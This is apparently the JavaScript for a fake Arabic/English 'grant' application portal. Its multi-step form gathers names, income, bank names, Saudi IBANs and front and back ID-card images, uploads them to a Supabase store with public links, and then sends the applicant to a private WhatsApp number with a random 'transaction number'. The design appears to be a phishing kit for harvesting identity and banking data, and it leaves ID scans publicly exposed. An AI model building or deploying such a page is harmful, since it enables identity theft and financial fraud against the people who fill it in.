/* ================================
   PORTAL JAVASCRIPT
   ================================ */

// Language Management
let currentLanguage = 'ar';
let currentStep = 1;

// Form Data Storage
const formData = {
    personalInfo: {},
    contactCareer: {},
    grantDetails: {},
    bankingInfo: {},
    attachments: {}
};

document.addEventListener('DOMContentLoaded', function() {
    setupLanguageSwitchers();
    setupFormListeners();
    setupFileUpload();
    setupPhoneFormatting();
    setupIBANFormatting();
    setupIncomeFormatting();
});

// ================================
// LANGUAGE MANAGEMENT
// ================================

function setupLanguageSwitchers() {
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            const lang = this.getAttribute('data-lang');
            switchLanguage(lang);
        });
    });
}

function switchLanguage(lang) {
    currentLanguage = lang;
    
    // Update all elements with data-en and data-ar
    document.querySelectorAll('[data-en][data-ar]').forEach(el => {
        if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
            el.placeholder = lang === 'en' ? el.getAttribute('data-en') : el.getAttribute('data-ar');
        } else {
            const text = lang === 'en' ? el.getAttribute('data-en') : el.getAttribute('data-ar');
            el.textContent = text;
        }
    });
    
    // Update HTML lang and direction
    document.documentElement.lang = lang;
    document.documentElement.dir = lang === 'en' ? 'ltr' : 'rtl';
    
    // Update active language button
    document.querySelectorAll('.lang-btn').forEach(btn => {
        btn.classList.remove('active');
        if (btn.getAttribute('data-lang') === lang) {
            btn.classList.add('active');
        }
    });
}

// ================================
// FORM NAVIGATION
// ================================

function nextStep() {
    if (validateStep(currentStep)) {
        saveStepData(currentStep);
        currentStep++;
        updateProgressBar();
        showStep(currentStep);
    }
}

function prevStep() {
    saveStepData(currentStep);
    currentStep--;
    updateProgressBar();
    showStep(currentStep);
}

function showStep(stepNumber) {
    // Hide all steps
    document.querySelectorAll('.form-step').forEach(step => {
        step.classList.remove('active');
    });
    
    // Show current step
    document.getElementById(`formStep${stepNumber}`).classList.add('active');
    
    // Scroll to top
    document.querySelector('.portal-container').scrollIntoView({ behavior: 'smooth', block: 'start' });
}

function updateProgressBar() {
    const progress = (currentStep / 5) * 100;
    document.getElementById('progressFill').style.width = progress + '%';
    
    // Update step indicators
    for (let i = 1; i <= 5; i++) {
        const step = document.getElementById(`step${i}`);
        if (i < currentStep) {
            step.classList.remove('active');
            step.classList.add('completed');
        } else if (i === currentStep) {
            step.classList.remove('completed');
            step.classList.add('active');
        } else {
            step.classList.remove('active', 'completed');
        }
    }
}

// ================================
// FORM VALIDATION
// ================================

function validateStep(stepNumber) {
    const step = document.getElementById(`formStep${stepNumber}`);
    const inputs = step.querySelectorAll('[required]');
    let isValid = true;

    inputs.forEach(input => {
        if (!validateField(input)) {
            isValid = false;
        }
    });

    return isValid;
}

function validateField(field) {
    const value = field.value.trim();
    const type = field.type;
    const name = field.name;
    const errorEl = field.parentElement.querySelector('.error-message');

    let isValid = true;
    let errorMessage = '';

    if (!value) {
        isValid = false;
        errorMessage = currentLanguage === 'ar' ? 'هذا الحقل مطلوب' : 'This field is required';
    } else if (type === 'email') {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(value)) {
            isValid = false;
            errorMessage = currentLanguage === 'ar' ? 'البريد الإلكتروني غير صحيح' : 'Invalid email';
        }
    } else if (name === 'phone') {
        const phoneRegex = /^\+?[0-9\s\-\(\)]{10,20}$/;
        if (!phoneRegex.test(value)) {
            isValid = false;
            errorMessage = currentLanguage === 'ar' ? 'رقم الهاتف غير صحيح' : 'Invalid phone number';
        }
    } else if (name === 'iban') {
        const ibanRegex = /^[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}$/;
        if (!ibanRegex.test(value)) {
            isValid = false;
            errorMessage = currentLanguage === 'ar' ? 'رقم الآيبان غير صحيح' : 'Invalid IBAN format';
        }
    } else if (name === 'grantAmount' || name === 'income') {
        if (isNaN(value) || value <= 0) {
            isValid = false;
            errorMessage = currentLanguage === 'ar' ? 'يجب أن يكون الرقم موجباً' : 'Must be a positive number';
        }
    }

    if (isValid) {
        field.classList.remove('error');
        if (errorEl) errorEl.textContent = '';
    } else {
        field.classList.add('error');
        if (errorEl) errorEl.textContent = errorMessage;
    }

    return isValid;
}

// ================================
// FORM DATA MANAGEMENT
// ================================

function saveStepData(stepNumber) {
    const step = document.getElementById(`formStep${stepNumber}`);
    const inputs = step.querySelectorAll('input, select, textarea');

    inputs.forEach(input => {
        if (input.type === 'file') return;
        
        const key = input.name;
        let dataGroup;

        if (stepNumber === 1) dataGroup = formData.personalInfo;
        else if (stepNumber === 2) dataGroup = formData.contactCareer;
        else if (stepNumber === 3) dataGroup = formData.grantDetails;
        else if (stepNumber === 4) dataGroup = formData.bankingInfo;

        if (dataGroup) {
            dataGroup[key] = input.value;
        }
    });
}

// ================================
// FILE UPLOAD
// ================================

function setupFileUpload() {
    const fileInputs = document.querySelectorAll('.file-input');

    fileInputs.forEach(input => {
        const uploadArea = input.nextElementSibling;
        const preview = uploadArea.nextElementSibling;

        // Click to upload
        uploadArea.addEventListener('click', () => input.click());

        // Drag and drop
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.style.backgroundColor = 'rgba(197, 160, 89, 0.2)';
            uploadArea.style.borderColor = '#1a2d5c';
        });

        uploadArea.addEventListener('dragleave', () => {
            uploadArea.style.backgroundColor = 'rgba(197, 160, 89, 0.05)';
            uploadArea.style.borderColor = '#C5A059';
        });

        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                handleFileSelect(files[0], input, preview);
            }
            uploadArea.style.backgroundColor = 'rgba(197, 160, 89, 0.05)';
            uploadArea.style.borderColor = '#C5A059';
        });

        // File input change
        input.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                handleFileSelect(e.target.files[0], input, preview);
            }
        });
    });
}

function handleFileSelect(file, input, preview) {
    // Validate file size (max 5MB)
    const maxSize = 5 * 1024 * 1024;
    if (file.size > maxSize) {
        alert(currentLanguage === 'ar' ? 'حجم الملف أكبر من 5 ميجابايت' : 'File size exceeds 5MB');
        return;
    }

    // Validate file type
    const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
    if (!allowedTypes.includes(file.type)) {
        alert(currentLanguage === 'ar' ? 'نوع الملف غير مدعوم' : 'File type not supported');
        return;
    }

    // Display preview
    const previewDiv = preview;
    previewDiv.classList.add('active');
    previewDiv.innerHTML = `
        <i class="fas fa-check-circle"></i>
        <span>${file.name}</span>
        <button type="button" class="remove-file" onclick="removeFile(this)">
            <i class="fas fa-times"></i>
        </button>
    `;

    // Store file data
    const fileKey = input.id;
    formData.attachments[fileKey] = file;
}

function removeFile(button) {
    const preview = button.parentElement;
    const uploadArea = preview.previousElementSibling;
    const fileInput = uploadArea.previousElementSibling;
    
    fileInput.value = '';
    preview.classList.remove('active');
    delete formData.attachments[fileInput.id];
}

// ================================
// FORM INPUT FORMATTING
// ================================

function setupPhoneFormatting() {
    const phoneInput = document.getElementById('phone');
    if (phoneInput) {
        phoneInput.addEventListener('input', function() {
            let value = this.value.replace(/\D/g, '');
            if (value.length > 10) value = value.slice(0, 10);
            
            if (value.length > 0) {
                value = '+966 ' + value.slice(-10).replace(/(\d{2})(\d{3})(\d{4})/, '$1 $2 $3');
            }
            this.value = value;
        });
    }
}

function setupIBANFormatting() {
    const ibanInput = document.getElementById('iban');
    if (ibanInput) {
        ibanInput.addEventListener('input', function() {
            let value = this.value.toUpperCase().replace(/\s/g, '');
            if (!value.startsWith('SA')) value = 'SA' + value.replace(/[^0-9]/g, '');
            
            value = value.slice(0, 24);
            
            let formatted = '';
            for (let i = 0; i < value.length; i += 4) {
                if (i > 0) formatted += ' ';
                formatted += value.slice(i, i + 4);
            }
            
            this.value = formatted;
        });
    }
}

function setupIncomeFormatting() {
    const incomeInputs = document.querySelectorAll('input[type="number"]');
    incomeInputs.forEach(input => {
        input.addEventListener('change', function() {
            if (this.value && !isNaN(this.value)) {
                this.value = parseInt(this.value).toLocaleString();
            }
        });
    });
}

// ================================
// FORM SUBMISSION
// ================================

document.getElementById('grantForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    // Validate last step
    if (!validateStep(5)) {
        alert(currentLanguage === 'ar' ? 'يرجى ملء جميع الحقول المطلوبة' : 'Please fill all required fields');
        return;
    }

    // Check if terms are accepted
    if (!document.getElementById('terms').checked) {
        alert(currentLanguage === 'ar' ? 'يجب قبول الشروط والأحكام' : 'You must accept terms and conditions');
        return;
    }

    // Save final data
    saveStepData(5);

    // Generate transaction number
    const transactionNumber = generateTransactionNumber();
    
    // Show success modal
    showSuccessModal(transactionNumber);
});

function generateTransactionNumber() {
    const year = new Date().getFullYear();
    const randomNumber = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    return `WA-${year}-${randomNumber}`;
}

function showSuccessModal(transactionNumber) {
    const modal = document.getElementById('successModal');
    document.getElementById('transactionNumber').textContent = transactionNumber;
    modal.classList.add('active');
    
    // Store transaction number for WhatsApp
    sessionStorage.setItem('transactionNumber', transactionNumber);
    
    // Auto-redirect after 3 seconds
    setTimeout(redirectToWhatsApp, 3000);
}

function redirectToWhatsApp() {
    const transactionNumber = sessionStorage.getItem('transactionNumber') || 'WA-2026-0000';
    const message = encodeURIComponent(
        `مرحباً، لقد قمت بتقديم طلب منحة.\nTransaction Number: ${transactionNumber}`
    );
    
    window.open(`https://wa.me/966545239928?text=${message}`, '_blank');
    
    // Reset form
    document.getElementById('grantForm').reset();
    sessionStorage.removeItem('transactionNumber');
    
    // Close modal
    document.getElementById('successModal').classList.remove('active');
    
    // Reset to first step
    currentStep = 1;
    updateProgressBar();
    showStep(1);
}


// ================================
// SUPABASE INTEGRATION
// ================================

// دالة رفع الملفات إلى Supabase
async function uploadFileToSupabase(file, fileName) {
    try {
        console.log(`📤 جاري رفع الملف: ${fileName}`);
        
        const { data, error } = await supabase.storage
            .from('applications')
            .upload(fileName, file, { 
                cacheControl: '3600', 
                upsert: false 
            });
        
        if (error) throw error;
        
        console.log('✅ تم رفع الملف بنجاح');
        
        // الحصول على الرابط العام
        const { data: publicUrlData } = supabase.storage
            .from('applications')
            .getPublicUrl(fileName);
        
        return publicUrlData.publicUrl;
        
    } catch (error) {
        console.error('❌ خطأ في رفع الملف:', error);
        throw error;
    }
}

// تعديل دالة redirectToWhatsApp - استبدل الدالة الموجودة
async function redirectToWhatsApp() {
    const transactionNumber = sessionStorage.getItem('transactionNumber') || 'WA-2026-0000';
    
    try {
        console.log('🚀 جاري حفظ البيانات في Supabase...');
        
        // جمع جميع البيانات من جميع الخطوات
        const applicationData = {
            full_name: formData.personalInfo.fullName,
            phone: formData.contactCareer.phone,
            email: formData.contactCareer.email,
            country: formData.personalInfo.country,
            marital_status: formData.personalInfo.maritalStatus,
            num_children: parseInt(formData.personalInfo.numChildren) || 0,
            profession: formData.contactCareer.profession,
            monthly_income: parseInt(formData.contactCareer.income) || 0,
            grant_type: formData.grantDetails.grantType,
            grant_amount: parseInt(formData.grantDetails.grantAmount) || 0,
            grant_description: formData.grantDetails.grantDescription,
            bank_name: formData.bankingInfo.bankName,
            account_holder: formData.bankingInfo.accountHolder,
            iban: formData.bankingInfo.iban.replace(/\s/g, ''),
            transaction_id: transactionNumber,
            status: 'pending',
            created_at: new Date().toISOString()
        };

        // رفع صورة الهوية الأمامية
        if (formData.attachments.idCardFront) {
            const frontFile = formData.attachments.idCardFront;
            const frontPath = `${transactionNumber}/front_${Date.now()}.${frontFile.name.split('.').pop()}`;
            applicationData.id_card_front_url = await uploadFileToSupabase(frontFile, frontPath);
            console.log('✅ تم رفع صورة الهوية الأمامية');
        }

        // رفع صورة الهوية الخلفية
        if (formData.attachments.idCardBack) {
            const backFile = formData.attachments.idCardBack;
            const backPath = `${transactionNumber}/back_${Date.now()}.${backFile.name.split('.').pop()}`;
            applicationData.id_card_back_url = await uploadFileToSupabase(backFile, backPath);
            console.log('✅ تم رفع صورة الهوية الخلفية');
        }

        // حفظ البيانات في Supabase
        console.log('💾 جاري حفظ البيانات في قاعدة البيانات...');
        const { data, error } = await supabase
            .from('applications')
            .insert([applicationData]);

        if (error) throw error;

        console.log('✅ تم حفظ جميع البيانات بنجاح في Supabase!');

    } catch (error) {
        console.error('❌ خطأ في حفظ البيانات:', error.message);
        // لا نوقف العملية، نستمر في فتح WhatsApp على أي حال
        console.warn('⚠️ تم تقديم الطلب محلياً، قد تكون هناك مشكلة في قاعدة البيانات');
    }
    
    // فتح WhatsApp بغض النظر عن نجاح Supabase
    const message = encodeURIComponent(
        `مرحباً، لقد قمت بتقديم طلب منحة.\nرقم المعاملة: ${transactionNumber}`
    );
    
    window.open(`https://wa.me/966545239928?text=${message}`, '_blank');
    
    // إعادة تعيين النموذج
    document.getElementById('grantForm').reset();
    sessionStorage.removeItem('transactionNumber');
    
    // إغلاق النموذج
    document.getElementById('successModal').classList.remove('active');
    
    // العودة إلى الخطوة الأولى
    currentStep = 1;
    updateProgressBar();
    showStep(1);
}
// Setup form field validation on blur
document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('input, select, textarea').forEach(field => {
        field.addEventListener('blur', function() {
            if (this.hasAttribute('required')) {
                validateField(this);
            }
        });
    });
});
